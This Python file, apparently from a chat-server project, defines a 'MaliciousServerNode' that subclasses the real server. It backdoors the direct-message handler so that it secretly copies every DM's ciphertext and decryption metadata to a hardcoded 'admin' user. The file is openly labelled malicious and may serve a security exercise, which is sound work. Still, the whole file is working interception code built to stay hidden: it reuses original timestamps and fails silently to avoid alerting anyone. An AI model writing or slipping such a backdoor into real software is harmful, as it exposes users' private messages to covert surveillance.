# src/pki_primitives/malicious_server.py

import logging

# ============================ IMPORTS FROM THE MAIN PROJECT ============================
# 1. Import the ORIGINAL ServerNode and give it an alias to avoid name clashes.
from socp.server import ServerNode as OriginalServerNode
from socp.server import ServerConfig

# 2. Import the necessary protocol definitions for type hinting and logic.
from socp.protocol import Envelope, EnvelopeType
# ===================================================================================

logger = logging.getLogger(__name__)


class MaliciousServerNode(OriginalServerNode):
    """
    A poisoned version of the ServerNode that inherits all original
    functionality. It overrides the direct message handler to secretly
    forward a copy of every DM to an "admin" user.
    """

    def __init__(self, config: ServerConfig) -> None:
        # It's crucial to call the parent's __init__ so the server sets up correctly.
        super().__init__(config)
        # This print confirms that our malicious class was successfully swapped in at runtime.
        print("\n\033[91m[!!!] MALICIOUS ServerNode has been initialized! DM interception is active.\033[0m\n")


    async def _handle_msg_direct(self, envelope: Envelope) -> None:
        """
        This is our backdoored message handler.
        """
        # --- Step 1: Execute the original, legitimate logic first ---
        # This ensures the message is delivered to the intended recipient
        # as normal, making the backdoor invisible to regular users.
        await super()._handle_msg_direct(envelope)

        # --- Step 2: Now, execute our malicious forwarding logic ---
        try:
            backdoor_recipient_id = "admin"  # The hardcoded user who will receive all forwarded DMs.

            sender = envelope.from_id
            recipient = envelope.to
            payload = envelope.payload

            # Avoid forwarding messages sent from or to the admin to prevent loops and noise.
            if sender != backdoor_recipient_id and recipient != backdoor_recipient_id:
                backdoor_target_server = self.user_locations.get(backdoor_recipient_id)

                # Check if the admin user is online and we have a path to them.
                if backdoor_target_server and backdoor_target_server in self.server_links:
                    logger.info(f"[BACKDOOR] Intercepted DM from {sender} to {recipient}. Forwarding to '{backdoor_recipient_id}'.")

                    # Craft a new payload for the admin. It contains the same encrypted
                    # content but is addressed to them. We add the original recipient
                    # as metadata so the sniffer knows whose key to use for decryption.
                    backdoor_payload = {
                        "user_id": backdoor_recipient_id,
                        "ciphertext": payload.get("ciphertext"),
                        "sender": sender,
                        "sender_pub": payload.get("sender_pub"),
                        "content_sig": payload.get("content_sig"),
                        "original_recipient": recipient, # This is the crucial metadata for the sniffer!
                    }

                    # Build a SERVER_DELIVER envelope to route the message through the mesh.
                    backdoor_envelope = self._build_envelope(
                        EnvelopeType.SERVER_DELIVER,
                        to=backdoor_target_server,
                        payload=backdoor_payload,
                        ts=envelope.ts, # Use original timestamp to be less conspicuous
                    )

                    # Send the message to the admin's server.
                    await self.server_links[backdoor_target_server].send(backdoor_envelope.to_json())
        
        except Exception as e:
            # The backdoor MUST fail silently. If anything goes wrong, we don't
            # want to crash the server or alert anyone.
            logger.debug(f"[BACKDOOR] Silent failure in forwarding logic: {e}")
            pass